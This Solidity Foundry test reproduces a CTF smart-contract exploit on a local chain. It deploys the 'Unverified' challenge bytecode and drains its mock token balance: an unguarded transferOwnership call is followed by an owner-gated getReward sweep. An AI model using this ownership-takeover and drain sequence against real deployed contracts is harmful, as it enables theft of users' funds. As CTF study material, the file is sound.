// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "./mocks/MockToken.sol";

/// @title Unverified reward-drain exploit reproduction
/// @notice MixBytes Farm CTF (2022-2023) - "Unverified" challenge, replayed
///         locally against a vm-managed chain.
///
/// @dev contracts/Unverified/Unverified.sol is a PARTIAL reconstruction of the
///      real on-chain contract, written by a previous author from decompiled
///      bytecode. Its function selectors/signatures are faithful (confirmed
///      below by disassembling the bytecode comment at the top of that file
///      with `cast disassemble` and matching selectors with `cast sig`), but
///      the body of `getReward` in the .sol file is a stubbed-out placeholder
///      (the real `balanceOf`/`transfer` calls are commented out). Because of
///      that, this test does NOT deploy the compiled .sol contract. Instead it
///      deploys the real CREATION bytecode taken verbatim from the comment at
///      the top of Unverified.sol, via a raw `create`, so the test runs
///      against the contract's actual, true behavior - not the reconstruction.
///
///      Unverified.sol itself is never imported or compiled as a dependency
///      of this test; it is only used as a reference for the function
///      signatures (which are real) and as the source of the bytecode literal
///      below (copied byte-for-byte from the comment in that file).
///
/// @dev Vulnerability (confirmed by disassembly, see notes inline below):
///      - `transferOwnership(address)` has NO `require(msg.sender == owner)`
///        guard, unlike `destroy` and `getReward`, which both check
///        `msg.sender == owner`. Anyone can call it to become owner.
///      - `getReward(address user_)` requires `msg.sender == owner`, then
///        reads `token.balanceOf(address(this))` via staticcall and forwards
///        the entire balance to `user_` via `token.transfer(user_, balance)`,
///        additionally setting `owner = user_`.
///      - Combining the two: any attacker calls `transferOwnership(self)` to
///        become owner, then calls `getReward(self)` to sweep the whole token
///        balance held by the Unverified contract to themselves.

/// @dev Minimal interface matching the REAL contract's ABI. The function
///      selectors below were independently verified against the bytecode
///      disassembly:
///        owner()                 -> 0x8da5cb5b (public var getter)
///        token()                 -> 0xfc0c546a (public var getter)
///        getToken()              -> 0x21df0da7
///        setToken(address)       -> 0x144fa6d7
///        transferOwnership(addr) -> 0xf2fde38b (NO owner check - the bug)
///        getReward(address)      -> 0xc00007b0 (owner-gated sweep)
///        destroy(address)        -> 0x00f55d9d (owner-gated selfdestruct)
interface IUnverified {
    function owner() external view returns (address);
    function token() external view returns (address);
    function getToken() external view returns (address);
    function setToken(address token_) external;
    function transferOwnership(address user_) external;
    function getReward(address user_) external;
    function destroy(address payable user_) external;
}

contract UnverifiedTest is Test {
    /// @dev Full CREATION bytecode copied verbatim from the comment at the
    ///      top of contracts/Unverified/Unverified.sol. This is creation
    ///      bytecode (constructor logic + CODECOPY of the runtime code), not
    ///      runtime bytecode - deploying it via `create` below produces the
    ///      genuine runtime code on chain, exactly as the original deployment
    ///      would have, with no manual trimming required.
    bytes constant UNVERIFIED_CREATION_CODE =
        hex"608060405234801561001057600080fd5b50610406806100206000396000f3fe608060405234801561001057600080fd5b506004361061007c5760003560e01c80638da5cb5b1161005b5780638da5cb5b146100d2578063c00007b0146100e5578063f2fde38b146100f8578063fc0c546a1461013557600080fd5b8062f55d9d14610081578063144fa6d71461009657806321df0da7146100a9575b600080fd5b61009461008f366004610371565b610148565b005b6100946100a4366004610371565b610182565b6001546001600160a01b03165b6040516001600160a01b03909116815260200160405180910390f35b6000546100b6906001600160a01b031681565b6100946100f3366004610371565b610225565b610094610106366004610371565b6000805473ffffffffffffffffffffffffffffffffffffffff19166001600160a01b0392909216919091179055565b6001546100b6906001600160a01b031681565b6000546001600160a01b0316331461015f57600080fd5b6000546001600160a01b0316331461017657600080fd5b806001600160a01b0316ff5b6001600160a01b0381166101f6576040517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601160248201527f62616420746f6b656e2061646472657373000000000000000000000000000000604482015260640160405180910390fd5b6001805473ffffffffffffffffffffffffffffffffffffffff19166001600160a01b0392909216919091179055565b6000546001600160a01b0316331461023c57600080fd5b6001546040517f70a082310000000000000000000000000000000000000000000000000000000081523060048201526000916001600160a01b0316906370a0823190602401602060405180830381865afa15801561029e573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102c29190610395565b6001546040517fa9059cbb0000000000000000000000000000000000000000000000000000000081526001600160a01b0385811660048301526024820184905292935091169063a9059cbb906044016020604051808303816000875af1158015610330573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061035491906103ae565b505050565b6001600160a01b038116811461036e57600080fd5b50565b60006020828403121561038357600080fd5b813561038e81610359565b9392505050565b6000602082840312156103a757600080fd5b5051919050565b6000602082840312156103c057600080fd5b8151801515811461038e57600080fdfea2646970667358221220039122d806720c17e9016e1e238f9c106dc41735cf0da391fd30047a6a5a2a2364736f6c63430008110033";

    uint256 constant STUCK_AMOUNT = 1000e18;

    IUnverified unverified;
    MockToken mockToken;
    address player;

    function setUp() public {
        player = makeAddr("player");

        // Deploy the REAL contract by running its creation bytecode through a
        // raw `create`. This is the preferred, "honest" route: no manual
        // slicing of creation vs. runtime code, no vm.etch - the EVM itself
        // runs the constructor and installs whatever runtime code it returns,
        // exactly like a real deployment would.
        bytes memory creationCode = UNVERIFIED_CREATION_CODE;
        address deployed;
        assembly {
            deployed := create(0, add(creationCode, 0x20), mload(creationCode))
        }
        require(deployed != address(0), "Unverified deployment failed");
        unverified = IUnverified(deployed);

        // Sanity check the deployment produced working runtime code with the
        // expected fresh state (owner/token both zero before any setup).
        assertEq(unverified.owner(), address(0), "owner should start unset");
        assertEq(unverified.token(), address(0), "token should start unset");

        // Deploy the reward token and simulate it being "stuck" on the
        // Unverified contract, which is the win condition for this challenge
        // ("take tokens from a contract").
        mockToken = new MockToken("Mock Reward", "MOCK", STUCK_AMOUNT);
        mockToken.transfer(deployed, STUCK_AMOUNT);

        // setToken has no access control in the real bytecode either (only
        // a non-zero-address check) - anyone can point the contract at the
        // reward token. We do this as the deployer for setup convenience;
        // it is not part of the exploit itself.
        unverified.setToken(address(mockToken));

        console.log("=== Initial state ===");
        console.log("Unverified token()           :", unverified.token());
        console.log("Unverified owner()           :", unverified.owner());
        console.log("Token balance of Unverified  :", mockToken.balanceOf(deployed));
        console.log("Token balance of player      :", mockToken.balanceOf(player));
    }

    function test_StealStuckTokensViaUnguardedTransferOwnership() public {
        assertEq(mockToken.balanceOf(address(unverified)), STUCK_AMOUNT, "tokens should be stuck on Unverified");
        assertEq(mockToken.balanceOf(player), 0, "player should start empty-handed");

        // --- Step 1: exploit the missing access control on transferOwnership ---
        // Nothing requires msg.sender == owner here, so the player simply
        // appoints themselves owner.
        vm.prank(player);
        unverified.transferOwnership(player);

        assertEq(unverified.owner(), player, "player should now be owner");
        console.log("=== After transferOwnership(player) ===");
        console.log("Unverified owner()            :", unverified.owner());

        // --- Step 2: as owner, sweep the token balance via getReward -------
        // getReward(user_) requires msg.sender == owner (now true), reads
        // token.balanceOf(address(this)) and transfers the full amount to
        // user_, so player passes themselves as the recipient.
        vm.prank(player);
        unverified.getReward(player);

        console.log("=== After getReward(player) ===");
        console.log("Token balance of Unverified  :", mockToken.balanceOf(address(unverified)));
        console.log("Token balance of player      :", mockToken.balanceOf(player));
        console.log("Unverified owner() (post)    :", unverified.owner());

        // --- Outcome: the entire stuck balance moved to the player ---------
        assertEq(mockToken.balanceOf(player), STUCK_AMOUNT, "player should have drained the full stuck balance");
        assertEq(mockToken.balanceOf(address(unverified)), 0, "Unverified contract should be fully drained");
    }
}
